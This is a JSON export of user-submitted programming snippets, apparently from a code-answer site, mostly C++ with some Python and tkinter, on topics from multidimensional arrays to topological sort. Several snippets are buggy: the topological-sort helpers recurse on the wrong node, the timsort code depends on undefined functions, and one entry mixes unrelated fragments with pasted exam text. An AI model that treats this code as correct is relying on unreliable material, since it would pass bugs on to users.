    "description": "// Two dimensional array int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5  // Three dimensional array //[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3 \nvoid printMatrix(array<array<int, COLS>, ROWS> matrix){ for (auto row : matrix){ //auto infers that row is of type array<int, COLS> for (auto element : row){ cout << element << ' '; } cout << endl; }\n\tint MyArray[2][3] = { {2, 3, 4}, {12, 13, 14} };  \t//visualize \t//2, 3, 4 \t//12, 13, 14  \tstd::cout << MyArray[0][2] << endl; // 4 \tstd::cout << MyArray[1][1] << endl; // 13  //First square bracket means how many rows you want in your array //Second squire bracket is for how many qulam you want in your array\n",
    "reg_date": "2021-10-12T11:43:56.000Z"
  },
  {
    "id": 4002,
    "keyword": null,
    "link": null,
    "title": " three way comparison operator c++",
    "description": "//Since C++20 \tlhs <=> rhs   The expression returns an object that - compares <0 if lhs < rhs - compares >0 if lhs > rhs - compares ==0 if lhs and rhs are equal/equivalent.\n",
    "reg_date": "2021-10-12T11:43:56.000Z"
  },
  {
    "id": 4003,
    "keyword": null,
    "link": null,
    "title": " through map c++",
    "description": "//Since c++17 for (auto& [key, value]: myMap) {     cout << key << \" has value \" << value << endl; } //Since c++11 for (auto& kv : myMap) {     cout << kv.first << \" has value \" << kv.second << endl; }\n    for (auto i : m)         cout << i.first << \"   \" << i.second              << endl;\n",
    "reg_date": "2021-10-12T11:43:56.000Z"
  },
  {
    "id": 4004,
    "keyword": null,
    "link": null,
    "title": " through set c++",
    "description": "// set::begin/end #include <iostream> #include <set>  int main () {   int myints[] = {75,23,65,42,13};   std::set<int> myset (myints,myints+5);    std::cout << \"myset contains:\";   for (std::set<int>::iterator it=myset.begin(); it!=myset.end(); ++it)     std::cout << ' ' << *it;    std::cout << '\\n';    return 0; }\n//Method 1  // Iterate over all elements of set  // using range based for loop  for (auto& i : mySet)  {     cout << i << \" , \";  }  //Method 2  // Iterate over all elements using for_each  // and lambda function  for_each(mySet.begin(), mySet.end(), [](const auto & str)  {     cout<<str<<\", \";  });  //Method 3  set<string>::iterator it = mySet.begin();  // Iterate till the end of set  while (it != mySet.end())  {     // Print the element     cout << *it << \", \";     //Increment the iterator     it++;  }\n//Method 1  for (auto& i : mySet)  {     cout << i << \" \";  }  //Method 2  for_each(mySet.begin(), mySet.end(), [](const auto & str)  {     cout<<str<<\" \";  });  //Method 3  set<string>::iterator it = mySet.begin();  while (it != mySet.end()) {     cout << *it << \" \";     it++;  } //Method 4  for (set<int>::iterator it=myset.begin(); it!=myset.end(); ++it)     cout <<*it << \" \";\n",
    "reg_date": "2021-10-12T11:43:56.000Z"
  },
  {
    "id": 4005,
    "keyword": null,
    "link": null,
    "title": " throw exception c++",
    "description": "#include <stdexcept>  int compare( int a, int b ) {     if ( a < 0 || b < 0 ) {         throw std::invalid_argument( \"received negative value\" );     } }\n//throw \"throws\" an exception.    It is usually used like:  if(something isnt right){   throw somethingee; }  /*(std::)*/cout << somethingee;\n// using standard exceptions #include <iostream> #include <exception> using namespace std;  class myexception: public exception {   virtual const char* what() const throw() {     return \"My exception happened\";   } } myex; // declare instance of \"myexception\" named \"myex\"  int main () {   try {     throw myex; // alternatively use: throw myexception();   } catch (exception& e) { // to be more specific use: (myexception& e)     cout << e.what() << '\\n';   }   return 0; }\n#include <stdexcept> #include <limits> #include <iostream>  using namespace std;  void MyFunc(int c) {     if (c > numeric_limits< char> ::max())         throw invalid_argument(\"MyFunc argument too large.\");     //... }\ntry { \t//do } catch (...){ \t//if error do }\n// exceptions #include <iostream> using namespace std;  int main () {   try   {     throw 20;   }   catch (int e)   {     cout << \"An exception occurred. Exception Nr. \" << e << '\\n';   }   return 0; }\n",
    "reg_date": "2021-10-12T11:43:56.000Z"
  },
  {
    "id": 4006,
    "keyword": null,
    "link": null,
    "title": " tic tac toe c++",
    "description": "#include<bits/stdc++.h> using namespace std;  static char board[3][3] = {{' ', ' ', ' '}, {' ', ' ', ' '}, {' ', ' ', ' '}}, ch1; string p1, p2; int r, c; int alt = 0;  void boardReset(){     for(int i = 0; i < 3; i++)         for(int j = 0; j < 3; j++)             board[i][j] = ' '; }  void printBoard(){     system(\"cls\");     for(int i = 0; i < 3; i++){         for(int j = 0; j < 3; j++){             if(j == 0)                 cout << \"\\t\\t\\t\";             cout << \" \" << board[i][j] << \" \";             if(j != 2)                 cout << \"|\";         }         cout << \"\\n\";         if(i != 2)             cout << \"\\t\\t\\t-----------\\n\";     } }  bool isWinner(char ch4){     return ((board[0][0] == ch4 && board[0][1] == ch4 && board[0][2] == ch4) ||      (board[1][0] == ch4 && board[1][1] == ch4 && board[1][2] == ch4) ||      (board[2][0] == ch4 && board[2][1] == ch4 && board[2][2] == ch4) ||      (board[0][0] == ch4 && board[1][0] == ch4 && board[2][0] == ch4) ||      (board[0][1] == ch4 && board[1][1] == ch4 && board[2][1] == ch4) ||      (board[0][2] == ch4 && board[1][2] == ch4 && board[2][2] == ch4) ||      (board[0][0] == ch4 && board[1][1] == ch4 && board[2][2] == ch4) ||      (board[0][2] == ch4 && board[1][1] == ch4 && board[2][0] == ch4)); }  bool Boardfull(){     for(int i = 0; i < 3; i++)         for(int j = 0; j < 3; j++)             if(board[i][j] == ' ')                 return false;     return true; }  void makeMove(char c1){     if(board[r-1][c-1] == ' ')         board[r-1][c-1] = c1;     else{         cout << \"\\nThis Position is Already Occupied!\\n\\n\";         alt--;     } }  void playGame(){     do{         if(alt % 2 == 0){             cout << endl << \"\\n\" << p1 << \"'s Turn\\n\";             ch1 = 'X';         }         else{             cout << endl << \"\\n\" << p2 << \"'s Turn\\n\";             ch1 = 'O';         }         while(1){             cout << \"Enter Column No. you want to make move: \";             cin >> c;             if(c < 1 || c > 3)                 cout << \"Enter Coulmn in Range 1 to 3\\n\";             else                 break;         }         while(1){             cout << \"Enter Row No. you want to make move: \";             cin >> r;             if(r < 1 || r > 3)                 cout << \"Enter Row in Range 1 to 3\\n\";             else                 break;         }         makeMove(ch1);         alt++;         printBoard();     }while(!isWinner(ch1) && !Boardfull()); }  int main(){     char ch;     system(\"cls\");     do{         cout << \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";         cout << \"\\t\\t\\tWELCOME TO THE TIC-TAC-TOE GAME\\n\";         cout << \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";         cout << \"\\nEnter First Player's first Name: \";         cin >> p1;         cout << \"Symbol Assigned to \" << p1 << \" is 'X'\\n\";         cout << \"\\nEnter Second Player's first Name: \";         cin >> p2;         cout << \"Symbol Assigned to \" << p2 << \" is 'O'\\n\\n\";         printBoard();         playGame();         cout << \"\\n\\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";         cout << \"\\t\\t\\t\\tRESULT: \";         if(Boardfull() && !(isWinner('X') || isWinner('O')))             cout << \"Game Tie!\\n\";         else if(alt % 2 == 0)             cout << p2 << \" Wins!\\n\";         else             cout << p1 << \" Wins!\\n\";         cout << \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\\n\";         cout << \"\\nDo You Want to Play Again? (Y / N): \";         boardReset();         alt = 0;         cin >> ch;     }while(ch != 'n' && ch != 'N'); } \n",
    "reg_date": "2021-10-12T11:43:57.000Z"
  },
  {
    "id": 4007,
    "keyword": null,
    "link": null,
    "title": " tie in c++",
    "description": "// packing/unpacking tuples #include <iostream>     // std::cout #include <tuple>        // std::tuple, std::make_tuple, std::tie  int main () {   int myint;   char mychar;    std::tuple<int,float,char> mytuple;    mytuple = std::make_tuple (10, 2.6, 'a');          // packing values into tuple    std::tie (myint, std::ignore, mychar) = mytuple;   // unpacking tuple into variables    std::cout << \"myint contains: \" << myint << '\\n';   std::cout << \"mychar contains: \" << mychar << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:43:57.000Z"
  },
  {
    "id": 4008,
    "keyword": null,
    "link": null,
    "title": " time and date (tm structure ) in C++",
    "description": "struct tm  { \tint tm_sec;  // seconds of minutes from 0 to 61 \tint tm_min;  // minutes of hour from 0 to 59 \tint tm_hour; // hours of day from 0 to 24 \tint tm_mday; // day of month from 1 to 31 \tint tm_mon;  // month of year from 0 to 11 \tint tm_year; // year since 1900 \tint tm_wday; // days since sunday \tint tm_yday; // days since January 1st \tint tm_isdst;// hours of daylight savings time }\n",
    "reg_date": "2021-10-12T11:43:57.000Z"
  },
  {
    "id": 4009,
    "keyword": null,
    "link": null,
    "title": " time complexity calculator online",
    "description": "pip install big-O-calculator \nint main() { assert(1 < 0); }\nA = [1,2,3,4,5] for i in A: \tprint(i)\nmain() { i=n while(i>=1) { i=i-10; i=i+20; i=i-30; } }\n#include<bits/stdc++.h> using namespace std;  int main() { int a,b; a = 1; b = 1; while(b < n) {   a += 1;   b += a;   cout<<\"Hi\"; } }\nfor i = 1 to n if i < 16 sum = sum + i else break\nclass Solution { public:     int minStoneSum(vector<int>& piles, int k) {         int sum=accumulate(piles.begin(), piles.end(), 0);         while(k!=0){             int i=*max_element(piles.begin(),piles.end());             std::vector<int>::iterator it = std::find(piles.begin(), piles.end(), i);             int index = std::distance(piles.begin(), it);             int t=floor(piles[index]/2);              piles[index]=i-t;             sum=sum-t;             k--;         }                 return sum;     }      };\nfunc eatChips(int bowlOfChips) { Println(\"Have some chips!\") for chips := 0; chips <= bowlOfChips; chips++ { // dip chips } Println(\"No more chips.\") } func pizzaDelivery(int boxesDelivered) { Println(\"Pizza is here!\") for pizzaBox := 0; pizzaBox <= boxesDelivered; pizzaBox++ { // open box [1] [2] [2] [2] United International University (UIU) Dept. of Computer Science & Engineering (CSE) Mid Exam Year: 2021 Trimester: Summer Course: CSE 2217/CSI 227 Data Structure and Algorithms II, Total Marks: 20, Time: 1 hour, Upload & Download: 15 min 2 for pizza := 0; pizza <= pizzaBox; pizza++ { // slice pizza for slice := 0; slice <= pizza; slice++ { // eat slice of pizza } } } Println(\"Pizza is gone.\") }\nint F(int n,int m){ if(n==1)   return(n) else   return F(n-1,m-1)*(n-2,m) } \n for (i = n; i > 0; i /=2)      a++;\n",
    "reg_date": "2021-10-12T11:43:57.000Z"
  },
  {
    "id": 4010,
    "keyword": null,
    "link": null,
    "title": " time delay in c++",
    "description": "//in Win32 #include<windows.h> Sleep(milliseconds);  //in Unix #include<unistd.h> unsigned int microsecond = 1000000; usleep(3 * microsecond); //sleeps for 3 seconds sleep(3);\n#include <unistd.h>  sleep(10);\n#include<windows.h> Sleep(milliseconds); \n",
    "reg_date": "2021-10-12T11:43:57.000Z"
  },
  {
    "id": 4011,
    "keyword": null,
    "link": null,
    "title": " time function c++",
    "description": "/* Answer to: \"time function c++\" */  #include <chrono>  using namespace std::chrono;   auto start = high_resolution_clock::now();  auto stop = high_resolution_clock::now();  auto duration = duration_cast<microseconds>(stop - start);     cout << duration.count() << endl; \n#include <chrono>  using namespace std::chrono;   auto start = high_resolution_clock::now();   // perform function to be timed here...  auto stop = high_resolution_clock::now();  cout << duration_cast<microseconds>(stop - start).count() << endl; \ntime_t time(time_t* arg);\n",
    "reg_date": "2021-10-12T11:43:57.000Z"
  },
  {
    "id": 4012,
    "keyword": null,
    "link": null,
    "title": " time function cpp",
    "description": "/* Answer to: \"time function c++\" */  #include <chrono>  using namespace std::chrono;   auto start = high_resolution_clock::now();  auto stop = high_resolution_clock::now();  auto duration = duration_cast<microseconds>(stop - start);     cout << duration.count() << endl; \n#include <chrono>  using namespace std::chrono;   auto start = high_resolution_clock::now();   // perform function to be timed here...  auto stop = high_resolution_clock::now();  cout << duration_cast<microseconds>(stop - start).count() << endl; \ntime_t time(time_t* arg);\n",
    "reg_date": "2021-10-12T11:43:57.000Z"
  },
  {
    "id": 4013,
    "keyword": null,
    "link": null,
    "title": " time measurement c++",
    "description": "//***C++11 Style:*** #include <chrono>  std::chrono::steady_clock::time_point begin = std::chrono::steady_clock::now(); std::chrono::steady_clock::time_point end = std::chrono::steady_clock::now();  std::cout << \"Time difference = \" << std::chrono::duration_cast<std::chrono::microseconds>(end - begin).count() << \"[&micro;s]\" << std::endl; std::cout << \"Time difference = \" << std::chrono::duration_cast<std::chrono::nanoseconds> (end - begin).count() << \"[ns]\" << std::endl; \n",
    "reg_date": "2021-10-12T11:43:57.000Z"
  },
  {
    "id": 4014,
    "keyword": null,
    "link": null,
    "title": " time t",
    "description": "# include <stdio.h> # include <time.h>   int main(void)  {      time_t now;      struct tm  ts;      char       buf[80];       // Obtem o tempo corrente      now = time(NULL);       // Formata e imprime o tempo, \"ddd yyyy-mm-dd hh:mm:ss zzz\"      ts = *localtime(&now);      strftime(buf, sizeof(buf), \"%a %Y-%m-%d %H:%M:%S %Z\", &ts);      printf(\"%s\\n\", buf);       return 0;  } \n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4015,
    "keyword": null,
    "link": null,
    "title": " time t c++ stack overflow",
    "description": "time_t mktimeUTC(struct tm* timeinfo) {     // *** enter in UTC mode     char* oldTZ = getenv(\"TZ\");     putenv(\"TZ=UTC\");     _tzset();     // ***      time_t ret = mktime ( timeinfo );      // *** Restore previous TZ     if(oldTZ == NULL)     {         putenv(\"TZ=\");     }     else     {         char buff[255];         sprintf(buff,\"TZ=%s\",oldTZ);         putenv(buff);     }     _tzset();     // ***      return ret; } \n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4016,
    "keyword": null,
    "link": null,
    "title": " timer in c++",
    "description": "#include <iostream> #include <chrono>  // This is how to measure the time it takes functions to finish  long add(int a, int b) { \treturn a + b; }  int main() { \tauto start = std::chrono::steady_clock::now(); \tstd::cout << \"9 + 10 = \" << add(9, 10) << '\\n'; \tauto end = std::chrono::steady_clock::now(); \tstd::chrono::duration<double> elapsed_seconds = end - start; \tstd::cout << \"elapsed time to compute 9 + 10: \" << elapsed_seconds.count() << \"s\\n\"; \treturn 0; }\n// CPP program to create a timer  #include <iomanip>  #include <iostream>  #include <stdlib.h>  #include <unistd.h>  using namespace std;   // hours, minutes, seconds of timer  int hours = 0;  int minutes = 0;  int seconds = 0;   // function to display the timer  void displayClock()  {  \t// system call to clear the screen  \tsystem(\"clear\");   \tcout << setfill(' ') << setw(55) << \"\t\t TIMER\t\t \\n\";  \tcout << setfill(' ') << setw(55) << \" --------------------------\\n\";  \tcout << setfill(' ') << setw(29);  \tcout << \"| \" << setfill('0') << setw(2) << hours << \" hrs | \";  \tcout << setfill('0') << setw(2) << minutes << \" min | \";  \tcout << setfill('0') << setw(2) << seconds << \" sec |\" << endl;  \tcout << setfill(' ') << setw(55) << \" --------------------------\\n\";  }   void timer()  {  \t// infinte loop because timer will keep  \t// counting. To kill the process press  \t// Ctrl+D. If it does not work ask  \t// ubuntu for other ways.  \twhile (true) {  \t\t \t\t// display the timer  \t\tdisplayClock();   \t\t// sleep system call to sleep  \t\t// for 1 second  \t\tsleep(1);   \t\t// increment seconds  \t\tseconds++;   \t\t// if seconds reaches 60  \t\tif (seconds == 60) {  \t\t \t\t\t// increment minutes  \t\t\tminutes++;   \t\t\t// if minutes reaches 60  \t\t\tif (minutes == 60) {  \t\t \t\t\t\t// increment hours  \t\t\t\thours++;  \t\t\t\tminutes = 0;  \t\t\t}  \t\t\tseconds = 0;  \t\t}  \t}  }   // Driver Code  int main()  {  \t// start timer from 00:00:00  \ttimer();  \treturn 0;  }  \n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4017,
    "keyword": null,
    "link": null,
    "title": " timsort in c++",
    "description": "// C++ program to perform TimSort. #include<bits/stdc++.h> using namespace std; const int RUN = 32;   // Iterative Timsort function to sort the array[0...n-1] (similar to merge sort) void timSort(int arr[], int n){     // Sort individual subarrays of size RUN     for (int i = 0; i < n; i+=RUN)         insertionSort(arr, i, min((i+RUN-1),(n-1)));//Simple insertionsort     // Start merging from size RUN (or 32).     // It will merge to form size 64, then 128, 256 and so on ....     for (int size = RUN; size < n;size = 2*size){         // pick starting point of left sub array. We are going to merge arr[left..left+size-1] and arr[left+size, left+2*size-1]         // After every merge, we increase left by 2*size         for (int left = 0; left < n;left += 2*size){             // find ending point of left sub array mid+1 is starting point of right sub array             int mid = left + size - 1;             int right = min((left + 2*size - 1),(n-1));             // merge sub array arr[left.....mid] & arr[mid+1....right]               if(mid < right)                 merge(arr, left, mid, right);//Simple mergesort         }     } }  \n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4018,
    "keyword": null,
    "link": null,
    "title": " tkinter python tutorial",
    "description": "from tkinter import Tk, Label, Button  class MyFirstGUI:     def __init__(self, master):         self.master = master         master.title(\"A simple GUI\")          self.label = Label(master, text=\"This is our first GUI!\")         self.label.pack()          self.greet_button = Button(master, text=\"Greet\", command=self.greet)         self.greet_button.pack()          self.close_button = Button(master, text=\"Close\", command=master.quit)         self.close_button.pack()      def greet(self):         print(\"Greetings!\")  root = Tk() my_gui = MyFirstGUI(root) root.mainloop() \n#Creating Tkinter Window In Python:  from tkinter import *  new_window = Tk() #Create a window ; spaces should be denoted with underscores ; every window should have a different name new_window.title(\"My Python Project\") #Name of screen ; name should be the one which you already declared (new_window) new_window.geometry(\"200x150\") #Resizes the default window size new_window.configure(bg = \"red\") #Gives color to the background  new_window.mainloop() #Shows the window on the screen\nfrom tkinter import * from tkinter import ttk  def calculate(*args):     try:         value = float(feet.get())         meters.set(int(0.3048 * value * 10000.0 + 0.5)/10000.0)     except ValueError:         pass  root = Tk() root.title(\"Feet to Meters\")  mainframe = ttk.Frame(root, padding=\"3 3 12 12\") mainframe.grid(column=0, row=0, sticky=(N, W, E, S)) root.columnconfigure(0, weight=1) root.rowconfigure(0, weight=1)  feet = StringVar() feet_entry = ttk.Entry(mainframe, width=7, textvariable=feet) feet_entry.grid(column=2, row=1, sticky=(W, E))  meters = StringVar() ttk.Label(mainframe, textvariable=meters).grid(column=2, row=2, sticky=(W, E))  ttk.Button(mainframe, text=\"Calculate\", command=calculate).grid(column=3, row=3, sticky=W)  ttk.Label(mainframe, text=\"feet\").grid(column=3, row=1, sticky=W) ttk.Label(mainframe, text=\"is equivalent to\").grid(column=1, row=2, sticky=E) ttk.Label(mainframe, text=\"meters\").grid(column=3, row=2, sticky=W)  for child in mainframe.winfo_children():      child.grid_configure(padx=5, pady=5)  feet_entry.focus() root.bind(\"<Return>\", calculate)  root.mainloop() \n# check this code first. from tkinter import *  app = Tk() # The title of the project app.title(\"The title of the project\") # The size of the window app.geometry(\"400x400\")  # Defining a funtion def c():     # Label     m = Label(app, text=\"Text\")     m.pack()   # Button l = Button(app, text=\"The text of the Butoon\", command=c) # Packing the Button l.pack() app.mainloop() # Quick Note :  # When you put a command you should not use parentheses # l = Button(app, text=\"The text of the Butoon\", command=c) # l = Button(app, text=\"The text of the Butoon\", command=c())\n#!/usr/bin/python  import Tkinter top = Tkinter.Tk() # Code to add widgets will go here... top.mainloop()\nbutton = tk.Button(     text=\"Click me!\",     width=25,     height=5,     bg=\"blue\",     fg=\"yellow\", ) \n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4019,
    "keyword": null,
    "link": null,
    "title": " to string c++",
    "description": "// to_string example #include <iostream>   // std::cout #include <string>     // std::string, std::to_string  int main () {   std::string pi = \"pi is \" + std::to_string(3.1415926);   std::string perfect = std::to_string(1+2+4+7+14) + \" is a perfect number\";   std::cout << pi << '\\n';   std::cout << perfect << '\\n';   return 0; }\n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4020,
    "keyword": null,
    "link": null,
    "title": " to string in c++",
    "description": "// ----------------------------------- C++ 11 and onwards // EXAMPLE #include <string> int iIntAsInt = 658; std::string sIntAsString = to_string(iIntAsInt);  /* SYNTAX to_string(<your-integer>) */  // ----------------------------------- BEFORE C++ 11 // EXAMPLE #include <sstream> #include <string> int iYourInt = 5; std::stringstream ssYourInt_AsStream << iYourInt; std::string sYourInt_AsString = ssYourInt_AsStream.str();\nint i=11; string str= to_string(i);\n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4021,
    "keyword": null,
    "link": null,
    "title": " tokenize string c++",
    "description": "std::vector<std::string> split(const string& input, const string& regex) {     // passing -1 as the submatch index parameter performs splitting     std::regex re(regex);     std::sregex_token_iterator         first{input.begin(), input.end(), re, -1},         last;     return {first, last}; } \nauto const str = \"The quick brown fox\"s; auto const re = std::regex{R\"(\\s+)\"}; auto const vec = std::vector<std::string>(     std::sregex_token_iterator{begin(str), end(str), re, -1},     std::sregex_token_iterator{} ); \n//the program take input as string and delimiter is ','. //delimiter can  be changed in line 9;  std::vector<std::string> tokenise(const std::string &str){     std::vector<std::string> tokens;     int first = 0;     //std::cout<<\"aditya\";     while(first<str.size()){         int second = str.find_first_of(',',first);         //first has index of start of token         //second has index of end of token + 1;         if(second==std::string::npos){             second = str.size();         }         std::string token = str.substr(first, second-first);         //axaxax,asas,csdcs,cscds         //0123456         tokens.push_back(token);         first = second + 1;     }     return tokens; } \n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4022,
    "keyword": null,
    "link": null,
    "title": " tolower funciton in cpp",
    "description": "#include<bits/stdc++.h>  using namespace std;  main() {      string s = \"Viet Nam\";      transform(s.begin(), s.end(), s.begin(), ::tolower); //lowercase     cout << s << endl;  } \n#include <cctype> #include <iostream> #include <cstring> #include <cstdio>  using namespace std;  int main() {     char str[] = \"John is from USA.\";      cout << \"The lowercase version of \\\"\" << str << \"\\\" is \" << endl;      for (int i=0; i<strlen(str); i++)         putchar(tolower(str[i]));          return 0; }\ntransform(s.begin(), s.end(), s.begin(), ::tolower); \n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4023,
    "keyword": null,
    "link": null,
    "title": " tolower in c++",
    "description": "#include<bits/stdc++.h>  using namespace std;  main() {      string s = \"Viet Nam\";      transform(s.begin(), s.end(), s.begin(), ::tolower); //lowercase     cout << s << endl;  } \n#include <cctype> #include <iostream> #include <cstring> #include <cstdio>  using namespace std;  int main() {     char str[] = \"John is from USA.\";      cout << \"The lowercase version of \\\"\" << str << \"\\\" is \" << endl;      for (int i=0; i<strlen(str); i++)         putchar(tolower(str[i]));          return 0; }\n",
    "reg_date": "2021-10-12T11:43:58.000Z"
  },
  {
    "id": 4024,
    "keyword": null,
    "link": null,
    "title": " top view of binary tree c++",
    "description": "/* This is not the entire code. It's just the function which implements     bottom view. You need to write required code. */  // Obj class is used to store node with it's distance from parent. class Obj {     public:         Node *root;         int dis; // distance from parent node. distance of root node will be 0.          Obj(Node *node, int dist)         {             root = node;             dis = dist;         } };  void topView(Node *root) {     queue<Obj*> q;     q.push(new Obj(root, 0));     map<int,int> m;      while(!q.empty())     {         Obj *ob = q.front();         q.pop(); \t\t       \t/* insert node of unique distance from parent node. ignore repitation             of distance. */         if(m.find(ob->dis) == m.end())             m[ob->dis] = ob->root->data;          if(ob->root->left != NULL)             q.push(new Obj(ob->root->left, ob->dis-1));          if(ob->root->right != NULL)             q.push(new Obj(ob->root->right, ob->dis+1));     }    \t// printing nodes.     for(auto it=m.begin(); it!=m.end(); it++)         cout << it->second << \"\\t\";      cout << endl; }\n// C++ Program to print Top View of a binary Tree  #include <iostream> #include <queue> #include <stack> using namespace std;  // class for Tree node class Node { public: \tNode *left, *right; \tint data; \tNode() { left = right = 0; } \tNode(int data) \t{ \t\tleft = right = 0; \t\tthis->data = data; \t} };  /* \t\t1 \t\t/ \\ \t\t2 3 \t\t\\ \t\t4 \t\t\\ \t\t\t5 \t\t\t\\ \t\t\t6 \tTop view of the above binary tree is \t2 1 3 6 */  // class for Tree class Tree { public: \tNode* root; \tTree() { root = 0; }  \tvoid topView() \t{ \t\t// queue for holding nodes and their horizontal \t\t// distance from the root node \t\tqueue<pair<Node*, int> > q;  \t\t// pushing root node with distance 0 \t\tq.push(make_pair(root, 0));  \t\t// hd is currect node's horizontal distance from \t\t// root node l is currect left min horizontal \t\t// distance (or max in magnitude) so far from the \t\t// root node r is currect right max horizontal \t\t// distance so far from the root node  \t\tint hd = 0, l = 0, r = 0;  \t\t// stack is for holding left node's data because \t\t// they will appear in reverse order that is why \t\t// using stack \t\tstack<int> left;  \t\t// vector is for holding right node's data \t\tvector<int> right;  \t\tNode* node;  \t\twhile (q.size()) {  \t\t\tnode = q.front().first; \t\t\thd = q.front().second;  \t\t\tif (hd < l) { \t\t\t\tleft.push(node->data); \t\t\t\tl = hd; \t\t\t} \t\t\telse if (hd > r) { \t\t\t\tright.push_back(node->data); \t\t\t\tr = hd; \t\t\t}  \t\t\tif (node->left) { \t\t\t\tq.push(make_pair(node->left, hd - 1)); \t\t\t} \t\t\tif (node->right) { \t\t\t\tq.push(make_pair(node->right, hd + 1)); \t\t\t}  \t\t\tq.pop(); \t\t} \t\t// printing the left node's data in reverse order \t\twhile (left.size()) { \t\t\tcout << left.top() << \" \"; \t\t\tleft.pop(); \t\t}  \t\t// then printing the root node's data \t\tcout << root->data << \" \";  \t\t// finally printing the right node's data \t\tfor (auto x : right) { \t\t\tcout << x << \" \"; \t\t} \t} };  // Driver code int main() { \t// Tree object \tTree t; \tt.root = new Node(1); \tt.root->left = new Node(2); \tt.root->right = new Node(3); \tt.root->left->right = new Node(4); \tt.root->left->right->right = new Node(5); \tt.root->left->right->right->right = new Node(6); \tt.topView(); \tcout << endl; \treturn 0; } \n",
    "reg_date": "2021-10-12T11:43:59.000Z"
  },
  {
    "id": 4025,
    "keyword": null,
    "link": null,
    "title": " topological sort c++",
    "description": "int n; // number of vertices vector<vector<int>> adj; // adjacency list of graph vector<bool> visited; vector<int> ans;  void dfs(int v) {     visited[v] = true;     for (int u : adj[v]) {         if (!visited[u])             dfs(u);     }     ans.push_back(v); }  void topological_sort() {     visited.assign(n, false);     ans.clear();     for (int i = 0; i < n; ++i) {         if (!visited[i])             dfs(i);     }     reverse(ans.begin(), ans.end()); } \n//Topological sort DFS //Complete code  //Possible Only on DAG(Directed Acyclic Graph) #include<bits/stdc++.h> using namespace std; void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v);  } void topo(int val,stack<int>&st,vector<int>adj[],vector<int>&visited) {     visited[val]=1;     for(auto i:adj[val])     {         if(!visited[i])         {             topo(i,st,adj,visited);         }     }     st.push(val); } void toposort(vector<int>adj[],int n) {     stack<int>st;     vector<int>visited(n,0);     for(int i=0;i<n;i++)     {         if(visited[i]==0)         {             topo(i,st,adj,visited);         }     }     vector<int>topo;     while(!st.empty())     {         topo.push_back(st.top());         st.pop();     }     int s=topo.size();     for(int j=0;j<s;j++)     {         cout<<topo[j]<<\" \";     } } int main() {     int vertex,edges;     cout<<\"Enter the vertex and edges\"<<endl;     cin>>vertex>>edges;     vector<int>adj[vertex];     int a,b;     cout<<\"Enter the links\"<<endl;     for(int i=0;i<vertex;i++)     {         cin>>a>>b;         addedge(adj,a,b);     }     toposort(adj,vertex);     return 0; } \n",
    "reg_date": "2021-10-12T11:43:59.000Z"
  },
  {
    "id": 4026,
    "keyword": null,
    "link": null,
    "title": " topological sort cp algorithms",
    "description": "int n; // number of vertices vector<vector<int>> adj; // adjacency list of graph vector<bool> visited; vector<int> ans;  void dfs(int v) {     visited[v] = true;     for (int u : adj[v]) {         if (!visited[u])             dfs(u);     }     ans.push_back(v); }  void topological_sort() {     visited.assign(n, false);     ans.clear();     for (int i = 0; i < n; ++i) {         if (!visited[i])             dfs(i);     }     reverse(ans.begin(), ans.end()); } \n",
    "reg_date": "2021-10-12T11:43:59.000Z"
  },
  {
    "id": 4027,
    "keyword": null,
    "link": null,
    "title": " topological sorting",
    "description": "int n; // number of vertices vector<vector<int>> adj; // adjacency list of graph vector<bool> visited; vector<int> ans;  void dfs(int v) {     visited[v] = true;     for (int u : adj[v]) {         if (!visited[u])             dfs(u);     }     ans.push_back(v); }  void topological_sort() {     visited.assign(n, false);     ans.clear();     for (int i = 0; i < n; ++i) {         if (!visited[i])             dfs(i);     }     reverse(ans.begin(), ans.end()); } \nL &larr; Empty list that will contain the sorted nodes while exists nodes without a permanent mark do     select an unmarked node n     visit(n)  function visit(node n)     if n has a permanent mark then         return     if n has a temporary mark then         stop   (not a DAG)      mark n with a temporary mark      for each node m with an edge from n to m do         visit(m)      remove temporary mark from n     mark n with a permanent mark     add n to head of L \nvoid dfs_helper(T src, map<int,bool>& visited, list<T> &ordering) {      //Recursive function that will traverse the graph                visited[src] = true;      //go to all nbr of that node that is not visited      for(T nbr:l[src]) {          if(!visited[nbr]) {              dfs_helper(src,visited,ordering);         }      }      ordering.push_front(src); }   int dfs(T src) {          map<int,bool> visited;          list<T> ordering;         //Mark all nodes as not visited.          //l = adjacency list implemented using std::unordered_map         for(auto p:l) {              T node = p.first;              visited[node] = false;          }           for(auto p:l) {             T node = p.first;             if(!visited[node]) {                 dfs_helper(node,visited,ordering);             }         }          //Finally print the list         for(auto node:ordering) {             cout << node << endl;         } }\ndef topological_sort():     for each node:         if visited[node] is False:             dfs(node) def dfs(node):     visited[node] = True     for nei in neighbours[node]:         dfs(node)     ret.insert_at_the _front(node)\n",
    "reg_date": "2021-10-12T11:43:59.000Z"
  },
  {
    "id": 4028,
